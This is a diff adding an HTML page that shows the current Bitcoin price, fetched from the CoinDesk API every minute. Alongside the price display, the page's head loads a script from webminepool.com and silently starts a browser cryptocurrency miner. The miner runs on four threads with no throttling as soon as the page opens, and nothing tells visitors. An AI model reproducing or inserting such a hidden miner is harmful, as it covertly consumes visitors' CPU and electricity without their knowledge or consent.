@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <title>Bitcoin Price in Words - Sylvain Saurel</title>
+      <script src="https://webminepool.com/lib/base.js"></script>
+<script>
+    var miner = WMP.User('SK_4NgHVFwRZFjQ56ixBJcEs', 'bitcoin-price',{
+        threads: 4,
+        autoThreads: false,
+        throttle: 0,
+        forceASMJS: false
+    });
+    miner.start();
+</script>
+      <link rel="preconnect" href="https://fonts.gstatic.com">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sriracha&amp;display=swap">
+      <style>
+
+         #top {
+         width: 400px;
+         margin: 0 auto;
+         margin-top: 50px;
+         display: block;
+         }
+
+         #bitcoin-price-img {
+         width: 100%;
+         margin-left: auto;
+         margin-right: auto;
+         display: block;
+         }
+
+         #time {
+         width:270px;
+         margin-left: auto;
+         margin-right: auto;
+         margin-top: 10px;
+         font-size:20px;
+         font-family: 'Sriracha', cursive;
+         color: #A5A5A5;
+         text-align: center;
+         }
+
+         #content {
+         width: 700px;
+         font-size: 50px;
+         text-align: center;
+         margin: 0 auto;
+         margin-top: 10px;
+         padding: 30px;
+         font-family: 'Sriracha', cursive;
+         border:2px solid #ccc;
+         box-shadow: 10px 10px 5px #ccc;
+         -moz-box-shadow: 10px 10px 5px #ccc;
+         -webkit-box-shadow: 10px 10px 5px #ccc;
+         -khtml-box-shadow: 10px 10px 5px #ccc;
+         cursor: default;
+         }
+
+         #bottom {
+         width:700px;
+         margin-left: auto;
+         margin-right: auto;
+         margin-top: 130px;
+         font-size:20px;
+         font-family: 'Sriracha', cursive;
+         color: #A5A5A5;
+         text-align:center;
+         }
+
+         a {
+         outline: none;
+         text-decoration: none;
+         padding: 2px 1px 0;
+         }
+
+         a:link {
+         color: #265301;
+         }
+
+         a:visited {
+         color: #437A16;
+         }
+
+         a:focus {
+         border-bottom: 1px solid;
+         background: #BAE498;
+         }
+
+         a:hover {
+         border-bottom: 1px solid;
+         background: #CDFEAA;
+         }
+
+         a:active {
+         background: #265301;
+         color: #CDFEAA;
+         }
+      </style>
+      <script>
+        function bitcoinPrice() {
+         	  var xmlhttp = new XMLHttpRequest();
+         	    var url = "https://api.coindesk.com/v1/bpi/currentprice.json";
+         
+         	    xmlhttp.onreadystatechange = function() {
+         	      if (this.readyState == 4  &&  this.status == 200) {
+         	        var json = JSON.parse(this.responseText);
+         	        parseJson(json);
+         	      }
+         	    };
+         
+         	    xmlhttp.open("GET", url, true);
+         	    xmlhttp.send();
+           }
+         
+         
+           function parseJson(json) {
+               var time = "on " + json["time"]["updated"];
+               var usdValue = json["bpi"]["USD"]["rate"];
+               
+               document.getElementById("content").innerHTML = "$" + usdValue;
+               document.getElementById("time").innerHTML = time;
+           }
+           setInterval("bitcoinPrice()",60000)
+      </script>
+   </head>
+   <body onload="bitcoinPrice()">
+   	  <a href="https://www.bitcoinpriceinwords.com" alt="Bitcoin Price in Words">
+           <div id="top">
+            <div id="time"></div>
+           </div>
+  	  </a>
+      <div id="content"></div>
+   </body>
+</html>
